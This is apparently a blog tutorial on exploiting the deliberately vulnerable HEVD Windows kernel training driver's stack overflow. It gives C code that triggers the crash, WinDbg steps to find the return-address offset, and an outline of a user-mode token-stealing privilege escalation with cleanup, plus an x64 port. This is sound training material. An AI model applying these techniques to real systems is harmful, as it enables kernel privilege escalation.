*The [HackSysExtremeVulnerableDriver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) by HackSysTeam always interested me and I got [positive feedback](https://twitter.com/abatchy17/status/939572701345148928) on writing about it, so here we are.*

*Exploit code can be found [here](https://github.com/abatchy17/HEVD-Exploits/tree/master/StackOverflow).*

### 1. Understanding the vulnerability

Link to code [here](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/106e3dd5d9c49326d55ce17c919bffa68ead1467/Driver/StackOverflow.c#L65).

```cpp
NTSTATUS TriggerStackOverflow(IN PVOID UserBuffer, IN SIZE_T Size) {
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG KernelBuffer[BUFFER_SIZE] = {0};

    PAGED_CODE();

    __try {
        // Verify if the buffer resides in user mode
        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer));

        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));

#ifdef SECURE
        // Secure Note: This is secure because the developer is passing a size
        // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence,
        // there will be no overflow
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));
#else
        DbgPrint("[+] Triggering Stack Overflow\n");

        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
        // because the developer is passing the user supplied size directly to
        // RtlCopyMemory()/memcpy() without validating if the size is greater or
        // equal to the size of KernelBuffer
        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }

    return Status;
}
```

`TriggerStackOverflow` is called via [`StackOverflowIoctlHandler`](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/106e3dd5d9c49326d55ce17c919bffa68ead1467/Driver/StackOverflow.c#L109), which is the IOCTL handler for `HACKSYS_EVD_IOCTL_STACK_OVERFLOW`.

Vulnerability is fairly obvious, a user supplied buffer is copied into a kernel buffer of size 2048 bytes (`512 * sizeof(ULONG)`). No boundary check is being made, so this is a classic stack smashing vulnerability.

### 2. Triggering the crash

```cpp
#include <Windows.h>
#include <stdio.h>

// IOCTL to trigger the stack overflow vuln, copied from HackSysExtremeVulnerableDriver/Driver/HackSysExtremeVulnerableDriver.h
#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)

int main()
{
	// 1. Create handle to driver
	HANDLE device = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	printf("[+] Opened handle to device: 0x%x\n", device);

	// 2. Allocate memory to construct buffer for device
	char* uBuffer = (char*)VirtualAlloc(
		NULL,
		2200,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	printf("[+] User buffer allocated: 0x%x\n", uBuffer);

	RtlFillMemory(uBuffer, 2200 , 'A');
	
	DWORD bytesRet;
	// 3. Send IOCTL
	DeviceIoControl(
		device,
		HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
		uBuffer,
		2200,
		NULL,
		0,
		&bytesRet,
		NULL
	);
}
```

Now compile this code and copy it over to the VM. Make sure a WinDBG session is active and run the executable from a shell. Machine should freeze and WinDBG should (okay, maybe will) flicker on your debugging machine.

HEVD shows you debugging info with verbose debugging enabled:
```
****** HACKSYS_EVD_STACKOVERFLOW ******
[+] UserBuffer: 0x000D0000
[+] UserBuffer Size: 0x1068
[+] KernelBuffer: 0xA271827C
[+] KernelBuffer Size: 0x800
[+] Triggering Stack Overflow
```

Enter `k` to show the stack trace, you should see something similar to this:

```
kd> k
 # ChildEBP RetAddr  
00 8c812d0c 8292fce7 nt!RtlpBreakWithStatusInstruction

06 8c813a98 41414141 HEVD!TriggerStackOverflow+0x94 [c:\hacksysextremevulnerabledriver\driver\stackoverflow.c @ 92]

```

If you continue execution, 0x41414141 will be popped into EIP. That wasn't so complicated :)

---

### 3. Controlling execution flow

Exploitation is straightforward with a token-stealing payload described in part 2. The payload will be constructed in user-mode and its address passed as the return address. When the function exists, execution is redirected to the user-mode buffer. This is called a privilege escalation exploit as you're executing code with higher privileges than you're supposed to have.

 Since [SMEP](http://j00ru.vexillium.org/?p=783) is not enabled on Windows 7, we can point jump to a payload in user-mode and get it executed with kernel privileges.

Now restart the vm `.reboot` and let's put a breakpoint at function start and end. To know where the function returns, use `uf` and calculate the offset.

```
kd> uf HEVD!TriggerStackOverflow
HEVD!TriggerStackOverflow [c:\hacksysextremevulnerabledriver\driver\stackoverflow.c @ 65]:
   65 9176b62a push    80Ch
   65 9176b62f push    offset HEVD!__safe_se_handler_table+0xc8 (917691d8)
   65 9176b634 call    HEVD!__SEH_prolog4 (91768014)
   
   ...
   
  101 9176b6ed call    HEVD!__SEH_epilog4 (91768059)
  101 9176b6f2 ret     8
  
kd> ? 9176b6f2 - HEVD!TriggerStackOverflow
Evaluate expression: 200 = 000000c8

kd> bu HEVD!TriggerStackOverflow

kd> bu HEVD!TriggerStackOverflow + 0xc8

kd> bl
     0 e Disable Clear  9176b62a     0001 (0001) HEVD!TriggerStackOverflow
     1 e Disable Clear  9176b6f2     0001 (0001) HEVD!TriggerStackOverflow+0xc8
```

Next, we need to locate RET's offset:

+ At `HEVD!TriggerStackOverflow+0x26`, `memset` is called with the kernel buffer address stored at `@eax`. Step over till you reach that instruction.
+ `@ebp + 4` points to the stored RET address. We can calculate the offset from the kernel buffer.

```
kd> ? (@ebp + 4) - @eax
Evaluate expression: 2076 = 0000081c
```

We now know that the return address is stored **2076** bytes away from the start of the kernel buffer! 

The big question is, where should you go after payload is executed?

---

### 4. Cleanup

Let's re-think what we're doing. Overwriting the return address of the first function on the stack means this function's remaining instructions won't be reached. In our case, this function is `StackOverflowIoctlHandler` at offset `0x1e`.

![WinDBG_screenshot_2]({{ "/images/kernel2.png" | absolute_url }})

Only two missing instructions need to be executed at the end of our payload:

```nasm
9176b718 pop     ebp
9176b719 ret     8
```

We're still missing something. This function expects a return value in `@eax`, anything other than 0 will be treated as a failure, so let's fix that before we execute the prologue.

```nasm
xor eax, eax                    ; Set NTSTATUS SUCCEESS
```

The full exploit can be found [here](https://github.com/abatchy17/HEVD-Exploits/tree/master/StackOverflow/Win7_x86_SP1). Explanation of payload [here]({{ "/kernel-exploitation-2#token-stealing-payload-windows-7-x86-sp1" | absolute_url }}).

### 5. Porting the exploit to Windows 7 64-bit

Porting this one is straightforward:

+ Offset to kernel buffer becomes **2056** instead of 2076.

+ [x64 compatible payload.]({{ "/kernel-exploitation-2#token-stealing-payload-windows-7-x64-sp1" | absolute_url }}).

+ Addresses are 8 bytes long, required some modifications.

+ No additional relevant protection is enabled.

Full exploit [here](https://github.com/abatchy17/HEVD-Exploits/tree/master/StackOverflow/Win7_x64_SP1).

---

### 6. Recap

+ A user-supplied buffer is being copied to a kernel buffer without boundary check, resulting in a class stack smashing vulnerability.

+ Function return address is controllable and can be pointed to a user-mode buffer as SMEP is not enabled.

+ Payload has to exist in an R?X memory segment, otherwise DEP will block the attempt.

+ No exceptions can be ignored, which means we have to patch the execution path after payload is executed. In our case that consisted of 1) setting the return value to 0 in `@eax` and 2) execute the remaining instructions in `StackOverflowIoctlHandler` before returning.

---

That's it! Part 4 will be exploiting this on Windows 10 with SMEP bypass!
